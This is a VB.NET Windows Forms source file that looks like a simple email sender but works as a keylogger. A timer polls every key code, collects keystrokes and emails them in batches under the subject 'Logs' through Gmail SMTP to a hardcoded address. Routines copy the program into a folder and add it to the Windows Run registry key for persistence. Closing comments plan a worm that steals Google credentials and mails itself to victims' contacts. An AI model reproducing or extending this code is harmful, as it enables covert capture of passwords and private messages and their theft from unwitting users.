Imports System.ComponentModel
Imports System.Net.Mail

Public Class Form1

    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Integer) As Short

    Dim copiedFile As String = "C:\Gmail\test.txt"

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        BackgroundWorker1.RunWorkerAsync()

    End Sub



    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        OpenFileDialog1.ShowDialog()
    End Sub

    Private Sub OpenFileDialog1_FileOk(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles OpenFileDialog1.FileOk
        attach.Text$ = OpenFileDialog1.FileName
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Using mail As New MailMessage
            mail.From = New MailAddress("userName711@gmail.com")
            mail.To.Add(destination.Text$)
            mail.Body = Body.Text

            '------worm like behavior: more at bottom----
            'can EMAIL Copied Self 
            ' Dim logs As New Attachment(copiedFile) 
            ' Email goes to reader, the hacker in this case.
                
            'mail.Attachments.Add(logs)
            mail.Subject = Subject.Text
            mail.Priority = mail.Priority.Normal
            Using SMTP As New SmtpClient
                SMTP.EnableSsl = True
                SMTP.Port = "587"
                SMTP.Host = "smtp.gmail.com" 
                SMTP.Credentials = New Net.NetworkCredential("userName711", "aaaa bbbb cccc dddd") '//Remove the @gmail.com and CHANGE THIS to your user name and API KEY 'OLD KEYsbkz lxnj yrnz cash
                SMTP.Send(mail)

            End Using
        End Using
    End Sub

    Private Sub BackgroundWorker1_RunWorkerCompleted(sender As Object, e As RunWorkerCompletedEventArgs) Handles BackgroundWorker1.RunWorkerCompleted
        destination.Clear()
        Subject.Clear()
        attach.Clear()
        Body.Clear()
        MsgBox("Sucess", MsgBoxStyle.Information)
    End Sub

    Private Sub sendMail()
        Using mail As New MailMessage
            mail.From = New MailAddress("userName711@gmail.com") 'CHANGE THIS to your user name
            mail.To.Add(destination.Text$)
            mail.Body = Body.Text

            ' Dim logs As New Attachment(copiedFile)
            ' mail.Attachments.Add(logs)
            mail.Subject = Subject.Text
            mail.Priority = mail.Priority.Normal
            Using SMTP As New SmtpClient
                SMTP.EnableSsl = True
                SMTP.Port = "587"
                SMTP.Host = "smtp.gmail.com"
                SMTP.Credentials = New Net.NetworkCredential("userName711", "aaaa bbbb cccc dddd") 'CHANGE THIS to your user name and API KEY
                '//Remove the @gmail.com after bobfarker
                SMTP.Send(mail)

                destination.Clear()
                Subject.Clear()
                attach.Clear()
                Body.Clear()
                MsgBox("Sucess", MsgBoxStyle.Information)

            End Using
        End Using
    End Sub

    Dim String1 As String = 0
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        'Me.Hide()
        ' Me.Visible = False
        Dim result As Integer
        For i = 1 To 255
            'result = 0
            result = GetAsyncKeyState(i)
            If result = -32767 Then
                String1 = String1 + Chr(i)

            End If
            'Label1.Text = String1.ToString
        Next i

        If String1.Length >= 50 Then

            ' My.Computer.FileSystem.WriteAllText(copiedFile,
            'String1, True)
            Dim BodyForMail As String = String1
            String1 = 0

            destination.Text = "userName111@gmail.com" 'CHANGE THIS to your user name
            Body.Text = BodyForMail
            Subject.Text = "Logs"
            sendMail()
            String1 = 0
        End If

    End Sub

    Private Sub checkLength()


    End Sub


    Public Sub copySelf() 'copies itself into a file that will be added to start up

        Try
            Dim FileLoc As String = My.Application.Info.DirectoryPath '//Gets File Location
            My.Computer.FileSystem.CopyFile(FileLoc + "\" + My.Application.Info.AssemblyName, "C:\Gmail\COS1.exe") '//NO WORK USE "\COS.exe" instead of --My.Application.Info.AssemblyName-- 
            '//Uses Location Found(File Folder Path(string=FileLoc) then Copies Itself to C: \Gmail\COS.exe
        Catch ex As Exception

        End Try

    End Sub

    Private Sub addToStart() 'Adds a file to start up
        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
        "GMA", "C:\Gmail\COS.exe")
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Timer1.Start()
    End Sub

                    
            '---------------Worm Requirements------------------
            ' 1. email LIST of VICTIM
            '    -GET THE LIST from Google if Gmail account is used, creditials stolen, or logged in
            ' 2. A way to steal google creditials and set up api key(may not be possible or hard). BINGO
            '    -----------Brick Wall: API KEY generation, retrieval, storage, and use.----------
            '        storage handled by local file .txt of .cfg
            '        use is handled by local file .txt of .cfg
            '        generation and retrieval will be hard.
            '
            '    IDEAS: 
            '    1. simulate user. Could have second screen of desktop log in and click, maybe hard for different screen sizes.
            '    but would have to guess on where to click/type based on size of browser windows. If UI changes then it cant
            '     adjust.
                ' CLI, python scripts, outsource the generation and just retreive. etc
            '    
            '    Generation of API KEY programmatically.
            '
            '     retrieval of API KEY programmatically.
End Class
